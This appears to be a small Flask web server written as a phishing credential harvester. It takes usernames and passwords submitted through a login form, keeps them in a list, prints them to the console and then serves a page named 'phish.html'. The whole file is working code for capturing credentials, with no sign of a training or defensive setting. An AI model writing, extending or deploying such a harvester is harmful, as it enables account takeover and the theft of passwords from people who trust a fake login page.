from flask import Flask, redirect, url_for, request,render_template
#from pyfuncs00 import *

app=Flask(__name__)

lst=[]

@app.route("/",methods=["GET","POST"])
def handlelogin():

    if request.method=="POST":
        uname=request.form["username"]
        pwd=request.form["pswd"]

        lst.append((uname,pwd))

        print(lst)

        return(render_template("phish.html"))

    return(render_template("index.html",message="retry"))



if __name__=="__main__":
    app.run(port=5000) 